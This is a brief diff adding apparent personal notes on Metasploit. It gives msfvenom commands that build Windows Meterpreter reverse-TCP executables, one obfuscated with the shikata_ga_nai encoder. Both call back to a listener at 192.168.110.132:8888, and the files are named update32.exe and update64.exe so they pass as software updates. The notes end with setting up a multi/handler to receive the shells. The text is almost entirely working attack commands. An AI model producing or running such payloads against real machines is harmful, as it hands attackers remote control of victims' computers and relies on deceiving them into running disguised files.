@@ -1,0 +1,8 @@
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5  LHOST=192.168.110.132 LPORT=8888 -f exe > update32.exe
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.110.132 LPORT=8888 -f exe > update64.exe
+
+use exploit/multi/handler
+
+***we have to let to know to meterpreter what is the payload****
+
+  set payload windows/meterpreter/reverse_tcp
